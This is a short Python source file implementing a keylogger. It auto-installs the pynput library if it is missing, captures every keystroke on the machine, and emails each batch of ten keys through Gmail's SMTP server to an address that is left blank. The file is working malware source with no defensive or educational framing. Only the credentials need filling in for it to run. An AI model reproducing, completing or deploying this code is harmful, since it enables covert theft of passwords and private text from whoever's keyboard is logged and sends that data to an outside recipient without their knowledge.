try:
    import os
    import smtplib
    import ssl
    import pynput
except ImportError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    from pynput import keyboard
    from pynput.keyboard import Listener
    
    count = 0
    keys = []

    def on_press(key):
        global keys, count
        key = str(key).replace("'", "")
        if key == 'Key.space':
            keys.append(' ')
        elif key == 'Key.enter':
            keys.append('\n')
        else:
            keys.append(key)

        count += 1
        if count >= 10:
            send_email(keys)
            keys = []
            count = 0

    def send_email(keys):
        message = ''.join(keys)

        smtp_server = "smtp.gmail.com"
        port = 587
        sender_email = ""
        password = ""
        receiver_email = ""

        context = ssl.create_default_context()

        try:
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.encode('utf-8'))
            print("Email sent successfully.")
        except Exception as e:
            print(f"An error occurred: {str(e)}")
        finally:
            server.quit()

    if __name__ == "__main__":
        with Listener(on_press=on_press) as l:
            l.join()